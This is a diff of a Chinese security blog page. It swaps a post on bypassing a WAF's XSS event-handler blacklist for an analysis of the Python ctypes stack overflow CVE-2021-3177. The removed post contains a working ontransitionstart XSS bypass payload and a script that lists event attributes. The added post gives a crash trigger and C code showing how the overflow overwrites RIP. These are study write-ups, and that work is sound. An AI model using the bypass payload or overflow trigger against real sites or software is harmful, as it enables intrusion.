-<h1 id="最后给自己的公众号打下广告"><a href="#最后给自己的公众号打下广告" class="headerlink" title="最后给自己的公众号打下广告"></a>最后给自己的公众号打下广告</h1><p>我在内部安全保障、安全产品两个方向有一些工作经验；在启明、百度等大厂也都呆过，也曾在房多多和安全团队一起做过从0到1的安全建设；在漏洞挖掘这一块虽然不是经验丰富，但之前也给”华为、阿里、360、百度、字节”等国内的大厂提交过一些高危严重漏洞（PS：并不代表我觉得这些src都非常好）；</p>
-<p>我后面会持续写 “安全产品”、”后端开发”、”有意思的安全问题/漏洞”，如果读者有什么想一起讨论的”题材”，欢迎在公众号后台留言；</p>
-<p>目前公众号一篇文章阅读量只有50-70，感觉太惨淡了。如果读者觉得我的文章有帮助，就希望能在公众号”点赞、在看、分享”，”点赞”和”在看”似乎也能增加一些曝光量。要不然文章就只能关注的人才能看得到。</p>
 
       
     </div>
@@ -1316,7 +1316,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E6%A0%88%E6%BA%A2%E5%87%BACVE-2021-3177%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1329,7 +1329,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/" class="post-title-link" itemprop="url">WAF攻防实践(4)</a>
+          <a href="/2021-12-26-Python%E6%A0%88%E6%BA%A2%E5%87%BACVE-2021-3177%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Python栈溢出CVE-2021-3177分析</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1353,63 +1353,63 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>上周在做安全测试时，发现站点的xss能够插入标签，当我想用on事件来执行javascript脚本时，发现被waf拦截了。</p>
-<p>经常怼waf的，应该会碰到过，waf针对标签on属性名的拦截策略分为两种：</p>
-<ul>
-<li>on属性名在黑名单列表</li>
-<li>以on开头，且满足其他条件，比如字符串长度大于一定长度</li>
-</ul>
-<p>举个例子，payload包含<code>&lt;div onXXXXX=alert(1)&gt;</code>时，按照第一种策略，只有<code>onXXXXX</code>在黑名单列表中，才会被拦截。第二种策略就直接拦截了，因为<code>onXXXXX</code>以<code>on</code>开头，且还比较长。</p>
-<p>本文碰到的waf拦截策略是第一种，所以只要找到一个on属性不在黑名单列表中，就应该可以绕过。</p>
-<p>所以问题变成了：</p>
-<ul>
-<li>怎么找到所有的on属性？</li>
-<li>怎么判断哪个on属性没有被过滤？</li>
-<li>怎么利用未过滤的on事件？</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>怎么找到所有的on属性？</p>
-<p>前端遍历BOM对象document的属性即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let results &#x3D; []</span><br><span class="line">for (let i in document)&#123;</span><br><span class="line">  if(i.startsWith(&quot;on&quot;))&#123;</span><br><span class="line">    results.push(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(results)</span><br><span class="line">localStorage.onAttrs&#x3D;JSON.stringify(results)</span><br></pre></td></tr></table></figure>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我正在学习缓冲区溢出，同时又对各个语言的安全问题感兴趣。最近看到 <a target="_blank" rel="noopener" href="https://bugs.python.org/issue42938">Python CVE-2021-3177</a> ，所以分析一下。</p>
+<p>从描述上看，这是一个sprintf函数引发的栈溢出漏洞。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>因为本文主要分析的和Python执行流程关系不大，所以也可以忽略第一步调试环境搭建，直接看调试分析。</p>
+<ol>
+<li><p>搭建调试环境</p>
+<p> 我用的IDE是Clion</p>
+<p> 先搭建Python调试环境，编译出可调试的Python二进制程序。这一步可以参考官网 <a target="_blank" rel="noopener" href="https://devguide.python.org/">Guide</a></p>
+<p> 准备好漏洞测试的Python代码</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from ctypes import *</span><br><span class="line">x &#x3D; c_double.from_param(1e300)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调试分析</p>
+<p> 在<code>_ctypes/callproc.c</code>下面代码打好断点</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">    sprintf(buffer, &quot;&lt;cparam &#39;%c&#39; (%f)&gt;&quot;,</span><br><span class="line">        self-&gt;tag, self-&gt;value.d);  &#x2F;&#x2F; 1e300</span><br><span class="line">    break;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p>因为results字符串非常长，会在chrome控制台会被截断，所以把它存到localStorage中，结果在 Chrome devtool -&gt; Application -&gt; Storage 中可以找到。</p>
-</li>
-<li><p>怎么判断哪个on属性没有被过滤？</p>
-<p>用burpsuite的intruder爆破模块过一遍，发现有两个属性没有拦截：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ontransitionstart</span><br><span class="line">onbeforexrselect</span><br></pre></td></tr></table></figure>
+<p> 在IDE中可以看到 self-&gt;value.d 是double类型，且值就是我们传入的参数。</p>
+<p> 从这里可以看出来，这个CVE漏洞和下面这段C代码漏洞是一样的</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  char buf[2];</span><br><span class="line">  double s&#x3D;1e300;  &#x2F;&#x2F;s值用户可控</span><br><span class="line"></span><br><span class="line">  sprintf(buf, &quot;%f&quot;, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这两个属性我之前也没见过，那怎么利用这两个属性执行js呢？</p>
+<p> 所以接下来我就去研究学习上面的C代码中漏洞是怎么利用的。</p>
 </li>
-<li><p>怎么利用<code>ontransitionstart</code>属性？</p>
-<p>根据<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/transitionstart_event">MDN-transitionstart文档</a>构造出利用方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;transition&quot; ontransitionstart&#x3D;&quot;alert(1)&quot;&gt;Hover over me&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.transition &#123;</span><br><span class="line">  width: 10000px;</span><br><span class="line">  height: 10000px;</span><br><span class="line">  background: rgba(255,0,0,1);</span><br><span class="line">  transition-property: transform, background;</span><br><span class="line">  transition-duration: 1s;</span><br><span class="line">  transition-delay: 1s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.transition:hover &#123;</span><br><span class="line">  transform: rotate(90deg);</span><br><span class="line">  background: rgba(255,0,0,0);</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+<li><p>sprintf引起的栈溢出分析</p>
+<p> <a target="_blank" rel="noopener" href="https://book.51cto.com/art/201311/419419.htm">网上文章</a>分析sprintf溢出都以<code>sprintf(buf, &quot;%s&quot;, s);</code>举例</p>
+<p> 对于 “%s” 格式符这种覆盖很容易理解，如果s=”a…a” 很多a字符时，就可以将rip覆盖成”\x6161616161616161”。</p>
+<p> 对于 “%f” 这种用浮点数字去覆盖buf变量，我就有一个疑问，浮点数怎么控制rip指针。比如s=11111111111111112222222233333333.0时，rip会被覆盖成什么？</p>
+<p> 先说自己的结论：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在漏洞代码中，double浮点数可以用来向很大内存中写入 &#96;\x30-\x39&#96;、&#96;\x2e&#96; 的字节。</span><br><span class="line"></span><br><span class="line">* 只能写入&#96;\x30-\x39&#96;、&#96;\x2e&#96;，而不能写其他字节，是因为 %f 转换成小数只能有&#96;[0-9.]&#96;，数字1-9对应的十六进制就是 &#96;\x30&#96;-&#96;\x39&#96;</span><br><span class="line">* 能覆盖多大的内存？</span><br><span class="line">    * 因为double类型，表示的小数位数能很大，所以至少可以覆盖300个字节</span><br><span class="line">    * 如果是float类型，就要小的多了</span><br></pre></td></tr></table></figure>
 
-<p>虽然文档写的chrome和firefox都支持transitionstart事件，但是上面的利用payload实际测试结果：</p>
-<blockquote>
-<p>firefox可以、chrome不行</p>
-</blockquote>
-<p>chrome用addEventListener可以监听<code>transitionstart</code>事件，但不能用<code>ontransitionstart</code>来监听事件。这个原因不知道为啥。</p>
+<p> 结论是怎么来的呢？</p>
+<p> 首先我们要知道浮点数在计算机并不总是能够精确的被表示，只能被近似表示。更具体的细节需要去了解”浮点数在计算机中的存储”，可以看文末的参考资料。</p>
+<p> 所以 <code>double s=11111111111111112222222233333333.0</code> 在内存中，s的值并不一定是 <code>11111111111111112222222233333333.0</code></p>
+<p> 我在代码中加了一行<code>printf(&quot;%f\n&quot;,s);</code>打印s变量实际的值。</p>
+<p> 从下面的分析来看，在64位系统上 11111111111111112222222233333333.0 会把rip覆盖成”\x30\x38\x30\x32\x34\x33\x35\x33”。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  char buf[2];</span><br><span class="line">  double s&#x3D;11111111111111112222222233333333.0; &#x2F;&#x2F;16个1，8个2，8个3</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; s实际的值是 1111111111111111 19575513 35342080.000000</span><br><span class="line">  &#x2F;&#x2F;            buf栈            rbp      rip</span><br><span class="line">  printf(&quot;%f\n&quot;,s);</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line"></span><br><span class="line">  print(&quot;&quot;.join([hex(ord(i)).replace(&quot;0x&quot;,&quot;\\x&quot;) for i in &quot;35342080&quot;]))</span><br><span class="line">  &quot;35342080&quot;字符串对应 \x33\x35\x33\x34\x32\x30\x38\x30</span><br><span class="line"></span><br><span class="line">  &gt;&gt;&gt; x&#x3D;[hex(ord(i)).replace(&quot;0x&quot;,&quot;\\x&quot;) for i in &quot;35342080&quot;]</span><br><span class="line">  &gt;&gt;&gt; x.reverse()</span><br><span class="line">  &gt;&gt;&gt; print(&quot;&quot;.join(x))</span><br><span class="line">  \x30\x38\x30\x32\x34\x33\x35\x33</span><br><span class="line"></span><br><span class="line">  *&#x2F;</span><br><span class="line">  &#x2F;&#x2F; 所以rip会被覆盖成 \x30\x38\x30\x32\x34\x33\x35\x33</span><br><span class="line">  &#x2F;&#x2F; gdb验证后，符合预期</span><br><span class="line"></span><br><span class="line">  sprintf(buf, &quot;%f&quot;, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>怎么利用<code>onbeforexrselect</code>属性？</p>
-<p>根据<a target="_blank" rel="noopener" href="https://immersive-web.github.io/dom-overlays/">onbeforexrselect文档</a>来看，似乎<code>beforexrselect</code>事件还只是一个草案。</p>
-<p>也因为transitionstart事件已经能利用了，所以也没有再研究。</p>
+<li><p><code>_ctypes/callproc.c</code>其他代码有没有相同的栈溢出问题？<br> self-&gt;value.d在_ctypes/ctypes.h文件有定义，是一个union数据类型。</p>
+<p> 这个union类型中看着好像还有几个字段也能用在sprintf栈溢出中，如下：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">union &#123;</span><br><span class="line">    char c;</span><br><span class="line">    char b;</span><br><span class="line">    short h;</span><br><span class="line">    int i;</span><br><span class="line">    long l;</span><br><span class="line">    long long q;</span><br><span class="line">    long double D; &#x2F;&#x2F; 可以利用</span><br><span class="line">    double d;  &#x2F;&#x2F; 可以利用</span><br><span class="line">    float f;  &#x2F;&#x2F; 能覆盖的内存有限</span><br><span class="line">    void *p;  &#x2F;&#x2F; 可能可以</span><br><span class="line">&#125; value;</span><br></pre></td></tr></table></figure>
+
+<p> 在 _ctypes/callproc.c 文件看了看，结论是只有d变量可以利用。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">union &#123;</span><br><span class="line">    ...</span><br><span class="line">    long double D; &#x2F;&#x2F; 没有用到这个变量</span><br><span class="line">    double d;  &#x2F;&#x2F; 可以利用</span><br><span class="line">    float f;  &#x2F;&#x2F; 能覆盖的内存有限</span><br><span class="line">    void *p;  &#x2F;&#x2F; 因为只用到了 %p 打印地址，没有 %s ，所以也无法利用</span><br><span class="line">&#125; value;</span><br></pre></td></tr></table></figure>
+
+<p> _ctypes/callproc.c文件中，也只有下面的代码sprintf d变量。所以只有这一处是存在栈溢出的。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">    sprintf(buffer, &quot;&lt;cparam &#39;%c&#39; (%f)&gt;&quot;,</span><br><span class="line">        self-&gt;tag, self-&gt;value.d);  &#x2F;&#x2F; 1e300</span><br><span class="line">    break;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
 </li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
-<li><p>从防守方来看，如果采用了on事件黑名单，就需要保证事件黑名单的全面。</p>
-</li>
-<li><p>chrome和firefox on属性有区别，或许可以作为一个区分浏览器的指纹特征（虽然感觉很不稳定）。</p>
-</li>
-<li><p>测试过程中，我还有一个疑问：不同元素之间的on属性是否会不同，比如div元素和document元素遍历出来的on属性是否会不同。有知道答案的读者可以后台告诉我。</p>
-</li>
-</ul>
-<h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p>我个人把防火墙的绕过分为两个类别：</p>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  本文仅仅分析了参数怎么控制rip指针，其中我学习到的点是”浮点数在内存中的表示”。</p>
+<p>  关于漏洞还有其他很多方面都没有分析，比如：</p>
 <ul>
-<li>架构层面的绕过，这种绕过不太关心具体的漏洞类型是xss还是sql注入</li>
-<li>漏洞类型相关的绕过</li>
+<li>怎么自动化检测这种漏洞？</li>
+<li>漏洞的实际影响是什么？<ul>
+<li>有多少Python应用存在漏洞？</li>
 </ul>
-<p>第一种架构层面的绕过姿势比较难找，这种较为通用的绕过姿势，从攻击队视角来看我觉得比较适合扫描器来绕过防火墙。这也是<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qAv2wspeuCfhCjTaz03hNg">你的扫描器可以绕过防火墙么</a>系列文章名称的由来。</p>
-<p>后面就都写到这个”waf攻防实践”系列里来。</p>
+</li>
+<li>漏洞触发的调用链是什么？</li>
+</ul>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="http://c.biancheng.net/cpp/html/3095.html">C语言float、double的内存表示</a></p>
 
       
     </div>
